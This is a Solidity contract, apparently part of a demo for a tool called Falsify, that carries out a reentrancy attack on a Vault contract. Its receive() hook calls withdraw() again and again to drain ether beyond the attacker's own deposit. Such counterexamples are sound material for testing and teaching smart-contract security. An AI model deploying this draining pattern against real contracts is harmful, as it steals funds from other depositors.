// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Vault} from "./Vault.sol";

/// @notice Reentrancy counterexample for the Falsify demo.
/// @dev Drains the Vault beyond the attacker's own deposit.
contract Attack {
    Vault public vault;
    uint256 public drained;

    constructor(Vault _vault) {
        vault = _vault;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        drained += msg.value;
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}
